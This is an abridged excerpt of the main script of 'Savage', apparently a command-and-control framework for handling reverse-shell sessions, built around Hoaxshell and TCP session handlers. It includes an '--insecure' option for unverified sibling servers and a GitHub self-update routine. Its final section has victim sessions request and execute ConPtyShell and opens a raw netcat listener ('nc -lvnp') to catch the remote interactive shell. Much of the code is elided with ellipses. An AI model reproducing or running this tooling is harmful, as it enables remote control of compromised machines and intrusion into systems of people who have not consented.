...
from Core.settings import Savage, Hoaxshell_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading
...
parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Savage client (sibling server) to connect to your instance without prompting you for verification.")
...
END = '\033[0m'  # reset couleur terminal
...
def print_banner():
    ...
    for charset in range(3):
        for pos in range(len(banner)):
            for i in range(len(banner[pos][charset])):
...
def print_meta():
	print(f'{META} Created by BenzoXdev')
	print(f'{META} Follow on GitHub, X, YT: @BenzoXdev')
...
def main():
	...
	if args.update:
		...
		try:
			...
			branch = 'main' 
			url = f'https://api.github.com/repos/BenzoXdev/Savage/git/trees/{branch}?recursive=1'
			raw_url = f'https://raw.githubusercontent.com/BenzoXdev/Savage/{branch}/'		
			Loading.active = True
			...
			if res_status_code == 200:
				...
				for filename in files:
					try:
						...
						print(f'\r[{ERR}] Failed to fetch file: {filename}. Installation may be corrupt. Consider reinstalling Savage.')
					...
					if not local_signature or (local_signature != latest_signature):
						...
						if update_consent:
							...
							if not updated:
								Loading.stop()
								print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Savage.')
								exit(1)
			...
			if Main_prompt.ready:
				...
				if cmd == 'help':					
					...
					if sessions_check[0]:
						...
						# Construct Savage issued command to request and exec ConPtyShell
						...
						if session_owner_id == core.return_server_uniq_id():
							...
							if verified.lower().strip() in ['y', 'yes']:
								# Start listener
								os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
								Savage_cmd['issuer'] = core.return_server_uniq_id()
								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, Savage_cmd)
